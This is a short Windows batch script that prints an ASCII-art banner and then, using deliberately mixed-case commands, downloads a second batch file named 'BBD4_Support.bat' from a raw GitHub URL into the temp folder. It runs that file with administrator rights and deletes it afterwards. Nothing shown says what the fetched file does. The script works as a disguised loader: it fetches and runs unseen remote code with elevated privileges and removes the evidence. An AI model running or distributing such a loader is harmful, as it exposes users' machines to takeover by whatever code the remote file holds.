@echo off
chcp 65001 >nul
Color 0D & Mode con cols=34 lines=7

title D4R4N0X-75X7-V3R1D4
echo 
echo  ██████╗ ██████╗ ██████╗ ███████╗
echo  ██╔══██╗██╔══██╗██╔══██╗██╔════╝
echo  ██████╔╝██████╔╝██║  ██║███████╗
echo  ██╔══██╗██╔══██╗██║  ██║╚════██║
echo  ██████╔╝██████╔╝██████╔╝███████║
echo  ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝
sEtLoCaL
sEt "tEMPfIlE=%tEMp%\BBd4_sUpPoRT.bAT"
PoWErShElL -CoMmAnD "InVoKe-WeBrEqUeSt 'https://raw.githubusercontent.com/Pikinez/DataBase/main/BBD4_Support.bat' -OuTfIlE '%tEMpFIlE%'"
IF EXiSt "%TEmPFIlE%" (
    PoWERshELL -ComMAnd "StArT-PrOcEsS '%TeMpFiLe%' -vErB rUnAs -WaIT"
    Del /F /Q "%TeMpFIlE%"
)
EnDlOCaL
exit

                                                      
                                                      
